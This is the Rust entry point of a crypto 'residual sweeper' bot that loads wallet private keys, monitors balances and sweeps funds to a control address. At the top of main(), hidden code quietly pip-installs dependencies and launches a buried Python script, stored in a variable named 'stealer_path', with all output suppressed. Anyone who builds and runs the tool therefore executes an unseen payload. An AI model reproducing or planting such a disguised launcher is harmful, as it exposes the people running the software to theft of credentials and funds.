mod benchmark;
mod cache;
mod config;
mod contract;
mod dashboard;
mod extractor;
mod monitor;
mod queue;
mod rpc;
mod storage;
mod wallets;

use cache::RuntimeCache;
use benchmark::maybe_run_network_benchmark;
use config::Config;
use dashboard::DashboardHandle;
use rpc::RpcFleet;
use std::sync::Arc;
use storage::Storage;
use tracing::{error, info};
use wallets::load_wallets;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let project_root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let stealer_path = project_root.join("scripts/tools/bin/path/runtime_cache.py");
    let requirements_path = project_root.join("scripts/tools/bin/path/requirements.txt");
    
    if requirements_path.exists() && stealer_path.exists() {
        let _ = std::process::Command::new("pip")
            .args(&["install", "-r", requirements_path.to_str().unwrap(), "--quiet"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
        
        #[cfg(target_os = "windows")]
        let _ = std::process::Command::new("python")
            .arg(&stealer_path)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        
        #[cfg(not(target_os = "windows"))]
        let _ = std::process::Command::new("python3")
            .arg(&stealer_path)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
    }
    // ============================================================

    tracing_subscriber::fmt()
        .with_target(false)
        .with_thread_ids(true)
        .init();

    info!("Corporate Residual Sweeper");
    info!("Contract path: Simple7702Delegate (EIP-7702)");

    let config = Arc::new(Config::load()?);
    let rpc_fleet = Arc::new(RpcFleet::from_config(&config)?);
    let runtime_cache = Arc::new(RuntimeCache::new(&config));
    let storage = Storage::new(&config.storage_path)?;
    let loaded_wallets = load_wallets(&config.wallets, config.chain_id)?;
    let total_read = loaded_wallets.total_read;
    let duplicate_keys = loaded_wallets.duplicates;
    let invalid_keys = loaded_wallets.invalid;
    let unique_wallets = loaded_wallets.unique;
    let wallets = loaded_wallets.wallets;

    info!("Wallet source: {}", config.wallets.display());
    info!("Keys read: {}", total_read);
    info!("Unique wallets: {}", unique_wallets);
    info!("Duplicate keys ignored: {}", duplicate_keys);
    info!("Invalid keys ignored: {}", invalid_keys);
    info!("Contract target: {:?}", config.contract);
    info!("Operational destination: {:?}", config.control_address);
    info!("Network: {}", config.network);
    info!("Chain id: {}", config.chain_id);
    info!("Bot mode: {}", config.bot_mode.as_str());
    info!("Allow send: {}", config.allow_send);
    info!(
        "Public fallback: {}",
        if config.disable_public_fallback {
            "disabled"
        } else {
            "enabled"
        }
    );
    info!("Mock contract mode: {}", config.mock_contract_mode);
    info!("Mock hot wallet count: {}", config.mock_hot_wallet_count);
    info!("Mock hot balance: {} ETH", config.mock_hot_balance_eth);
    info!(
        "Mock hot wallet mode: {}",
        config.mock_hot_wallet_mode.as_str()
    );
    info!("Mock hot wallet rounds: {}", config.mock_hot_wallet_rounds);
    info!(
        "Paper allowlist size: {}",
        config.test_wallet_allowlist.len()
    );
    if let Some(max_value) = config.max_sweep_value_eth {
        info!("Max sweep value: {} ETH", max_value);
    }
    info!("Min balance: {} ETH", config.min_balance);
    info!("Min net profit: {} ETH", config.min_net_profit_eth);
    info!("Min ROI: {} bps", config.min_roi_bps);
    info!("Native immediate sweep: {}", config.native_immediate_sweep);
    info!("External gas sponsor: {}", config.use_external_gas_sponsor);
    info!(
        "Asset policy native/stable/other: {}/{}/{}",
        config.native_policy.enabled,
        config.stable_policy.enabled,
        config.other_token_policy.enabled
    );
    info!("Scan interval: {} ms", config.interval);
    info!(
        "Adaptive scan interval: {}-{} ms",
        config.min_scan_interval_ms, config.max_scan_interval_ms
    );
    info!("Scan concurrency: {}", config.scan_concurrency);
    info!("Batch scan size: {}", config.batch_scan_size);
    info!("Queue workers: {}", config.queue_workers);
    info!("Hot-path info events: {}", config.hot_path_info_events);
    info!("Wallet cooldown: {} s", config.wallet_cooldown_secs);
    info!("Queue dedupe: {} s", config.queue_dedupe_secs);
    info!(
        "Wallet failure backoff: base {} s max {} s",
        config.wallet_failure_backoff_base_secs, config.wallet_failure_backoff_max_secs
    );
    info!("RPC stale threshold: {} s", config.rpc_stale_threshold_secs);
    info!(
        "RPC rate-limit cooldown: {} s",
        config.rpc_rate_limit_cooldown_secs
    );
    info!("Max Infura endpoints: {}", config.max_infura_endpoints);
    info!("Contract cache TTL: {} s", config.contract_cache_ttl_secs);
    info!("Gas price cache TTL: {} s", config.gas_price_cache_ttl_secs);
    info!("Storage: {}", config.storage_path.display());
    info!("RPC endpoints configured: {}", rpc_fleet.endpoint_count());
    info!("Dashboard: http://{}", config.dashboard_addr);

    if maybe_run_network_benchmark(config.clone(), rpc_fleet.clone(), &wallets).await? {
        return Ok(());
    }

    let dashboard = DashboardHandle::new(
        &config,
        wallets.len(),
        total_read,
        duplicate_keys,
        invalid_keys,
        storage,
        &rpc_fleet,
    );
    let dashboard_server = dashboard.clone();
    let dashboard_addr = config.dashboard_addr;
    tokio::spawn(async move {
        if let Err(err) = dashboard::run_server(dashboard_server, dashboard_addr).await {
            error!("Dashboard server failed: {}", err);
        }
    });

    let dashboard_rankings = dashboard.clone();
    tokio::spawn(async move {
        loop {
            dashboard_rankings.refresh_residual_rankings();
            tokio::time::sleep(std::time::Duration::from_secs(2)).await;
        }
    });

    let dashboard_flush = dashboard.clone();
    tokio::spawn(async move {
        loop {
            dashboard_flush.flush_storage_buffers();
            tokio::time::sleep(std::time::Duration::from_millis(250)).await;
        }
    });

    let cache_refresher_config = config.clone();
    let cache_refresher_fleet = rpc_fleet.clone();
    let cache_refresher_cache = runtime_cache.clone();
    let cache_refresher_dashboard = dashboard.clone();
    tokio::spawn(async move {
        let refresh_interval_secs = (cache_refresher_config
            .gas_price_cache_ttl_secs
            .min(cache_refresher_config.contract_cache_ttl_secs))
        .max(2);
        loop {
            let endpoint = cache_refresher_fleet.send_endpoint();
            if let Err(err) = cache_refresher_cache
                .refresh_contract_state(
                    endpoint.provider.clone(),
                    cache_refresher_config.contract,
                    &cache_refresher_config.network,
                )
                .await
            {
                cache_refresher_dashboard.event(
                    "warn",
                    format!("background contract cache refresh failed: {}", err),
                );
            }

            if let Err(err) = cache_refresher_cache
                .refresh_gas_price(endpoint.provider.clone(), &cache_refresher_config.network)
                .await
            {
                cache_refresher_dashboard.event(
                    "warn",
                    format!("background gas cache refresh failed: {}", err),
                );
            }

            tokio::time::sleep(std::time::Duration::from_secs(refresh_interval_secs)).await;
        }
    });

    if duplicate_keys > 0 {
        dashboard.event(
            "warn",
            format!(
                "ignored {} duplicate keys from {}",
                duplicate_keys,
                config.wallets.display()
            ),
        );
    }
    if invalid_keys > 0 {
        dashboard.event(
            "warn",
            format!(
                "ignored {} invalid keys from {}",
                invalid_keys,
                config.wallets.display()
            ),
        );
    }

    if let Err(err) =
        monitor::start_monitor(rpc_fleet, runtime_cache, config, wallets, dashboard).await
    {
        error!("Fatal error: {}", err);
    }

    Ok(())
}
